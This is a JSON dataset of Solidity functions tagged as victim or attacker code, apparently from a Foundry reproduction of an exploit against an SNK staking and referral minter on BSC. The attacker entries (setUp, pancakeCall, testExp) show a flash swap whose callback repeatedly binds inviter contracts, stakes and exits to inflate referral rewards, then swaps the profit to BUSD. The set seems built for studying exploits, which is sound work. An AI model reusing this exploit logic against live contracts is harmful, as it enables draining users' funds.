[
  {
    "contract/interface": "ISNKMinter",
    "source_type": "victim_contract",
    "function_name": "bindParent",
    "original_code": "    function bindParent(address parent) public {\n        address inviter = inv.getInviter(msg.sender);\n        if (inviter == address(0) && parent != address(0)) {\n            inv.invite(msg.sender, parent);\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISNKMinter",
    "source_type": "victim_contract",
    "function_name": "exit",
    "original_code": "    function exit() public updateReward(msg.sender) {\n        uint256 amount = balanceOf(msg.sender);\n        require(amount > 0, \"Cannot withdraw 0\");\n\n        // uint256 onode = getUserNode(msg.sender);\n        uint256 onode = userPeerNode[msg.sender];\n\n        super.withdraw(amount, 0);\n\n        uint256 nnode = getUserNode(msg.sender);\n\n        if (onode != nnode) {\n            userPeerNode[msg.sender] = nnode;\n\n            if (nnode > 0) nodeCount[nnode - 1]++;\n\n            if (onode > 0) nodeCount[onode - 1]--;\n        }\n        \n\n        address parent = msg.sender;\n        for (uint256 i = 0; i < 20; i++) {\n            parent = inv.getInviter(parent);\n            if (parent == address(0)) break;\n\n            // uint256 oldnode = getUserNode(parent);\n            uint256 oldnode = userPeerNode[parent];\n\n            if (communityBalances[parent] > amount) {\n                communityBalances[parent] = communityBalances[parent].sub(\n                    amount\n                );\n            } else {\n                communityBalances[parent] = 0;\n            }\n\n            uint256 newnode = getUserNode(parent);\n\n            if (oldnode != newnode) {\n                userPeerNode[parent] = newnode;\n\n                if (newnode > 0) nodeCount[newnode - 1]++;\n\n                if (oldnode > 0) nodeCount[oldnode - 1]--;\n            }\n\n        }\n\n        emit Withdrawn(msg.sender, amount);\n        if (block.timestamp > starttime) {\n            getReward();\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISNKMinter",
    "source_type": "victim_contract",
    "function_name": "getReward",
    "original_code": "    function getReward() public updateReward(msg.sender) checkStart {\n        uint256 reward = dynamicEarned(msg.sender) + privateEarned(msg.sender);\n        if (reward > 0) {\n            prewards[msg.sender] = 0;\n            drewards[msg.sender] = 0;\n\n            token.safeTransfer(msg.sender, reward);\n\n            emit RewardPaid(msg.sender, reward);\n            totalRewards = totalRewards.add(reward);\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISNKMinter",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(uint256 amount, uint256 feeAmount) internal {\n        _totalSupply = _totalSupply.add(amount.sub(feeAmount));\n        _balances[msg.sender] = _balances[msg.sender].add(\n            amount.sub(feeAmount)\n        );\n        y.safeTransferFrom(msg.sender, address(this), amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "WETH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "addLiquidity",
    "original_code": "    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        returns (\n            uint256 amountA,\n            uint256 amountB,\n            uint256 liquidity\n        );\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "addLiquidityETH",
    "original_code": "    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "factory",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "getAmountIn",
    "original_code": "    function getAmountIn(\n        uint256 amountOut,\n        uint256 reserveIn,\n        uint256 reserveOut\n    ) external pure returns (uint256 amountIn);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "getAmountOut",
    "original_code": "    function getAmountOut(\n        uint256 amountIn,\n        uint256 reserveIn,\n        uint256 reserveOut\n    ) external pure returns (uint256 amountOut);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "getAmountsIn",
    "original_code": "    function getAmountsIn(uint256 amountOut, address[] calldata path)\n        external\n        view\n        returns (uint256[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "getAmountsOut",
    "original_code": "    function getAmountsOut(uint256 amountIn, address[] calldata path)\n        external\n        view\n        returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "quote",
    "original_code": "    function quote(\n        uint256 amountA,\n        uint256 reserveA,\n        uint256 reserveB\n    ) external pure returns (uint256 amountB);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "removeLiquidity",
    "original_code": "    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 liquidity,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB);\n\n    function removeLiquidityETH(\n        address token,\n        uint256 liquidity,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountToken, uint256 amountETH);\n\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint256 liquidity,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline,\n        bool approveMax,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256 amountA, uint256 amountB);\n\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint256 liquidity,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline,\n        bool approveMax,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256 amountToken, uint256 amountETH);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "removeLiquidityETH",
    "original_code": "    function removeLiquidityETH(\n        address token,\n        uint256 liquidity,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountToken, uint256 amountETH);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "removeLiquidityETHWithPermit",
    "original_code": "    function removeLiquidityETHWithPermit(\n        address token,\n        uint256 liquidity,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline,\n        bool approveMax,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256 amountToken, uint256 amountETH);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "removeLiquidityWithPermit",
    "original_code": "    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint256 liquidity,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline,\n        bool approveMax,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256 amountA, uint256 amountB);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "swapETHForExactTokens",
    "original_code": "    function swapETHForExactTokens(\n        uint256 amountOut,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "swapExactETHForTokens",
    "original_code": "    function swapExactETHForTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForETH",
    "original_code": "    function swapExactTokensForETH(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "swapTokensForExactETH",
    "original_code": "    function swapTokensForExactETH(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter01",
    "source_type": "victim_contract",
    "function_name": "swapTokensForExactTokens",
    "original_code": "    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        for (uint256 i = 0; i < 10; ++i) {\n            HackerTemplate t1 = new HackerTemplate();\n            HackerTemplate t = HackerTemplate(parents[i]);\n            t1.bind(parents[i]);\n            SNKToken.transfer(address(t1), SNKToken.balanceOf(address(this)));\n            t1.stake();\n            t.exit2();\n            t1.exit1();\n        }\n        SNKToken.transfer(address(pool), 85_000 ether);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "parents",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 27_784_455);\n        deal(address(SNKToken), address(this), 1000 ether);\n        for (uint256 i = 0; i < 10; ++i) {\n            HackerTemplate t1 = new HackerTemplate();\n            SNKToken.transfer(address(t1), 100 ether);\n            t1.stake();\n            parents.push(address(t1));\n        }\n        uint256 startTime = block.timestamp;\n        vm.warp(startTime + 20 days);\n        SNKToken.approve(address(router), type(uint256).max);\n        SNKToken.approve(address(pool), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() external {\n        pool.swap(80_000 ether, 0, address(this), bytes(\"0x123\"));\n\n        address[] memory path = new address[](2);\n        path[0] = address(SNKToken);\n        path[1] = (address(BUSD));\n        emit log_named_decimal_uint(\"EXP SNK Amount get\", SNKToken.balanceOf(address(this)), 18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000\n        );\n        emit log_named_decimal_uint(\"EXP BUSD Amount get\", BUSD.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SNKExp",
    "source_type": "attacker_contract",
    "function_name": "testNormal",
    "original_code": "    function testNormal() external {\n        for (uint256 i = 0; i < 10; ++i) {\n            HackerTemplate t = HackerTemplate(parents[i]);\n            t.exit2();\n        }\n        address[] memory path = new address[](2);\n        path[0] = address(SNKToken);\n        path[1] = (address(BUSD));\n        emit log_named_decimal_uint(\"Normal SNK Amount should get\", SNKToken.balanceOf(address(this)), 18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000\n        );\n        emit log_named_decimal_uint(\"Normal BUSD Amount should get\", BUSD.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HackerTemplate",
    "source_type": "victim_contract",
    "function_name": "bind",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HackerTemplate",
    "source_type": "victim_contract",
    "function_name": "exit1",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HackerTemplate",
    "source_type": "victim_contract",
    "function_name": "exit2",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HackerTemplate",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "  function owner() public view returns (address) {\n    return _owner;\n  }\n\n",
    "description": ""
  }
]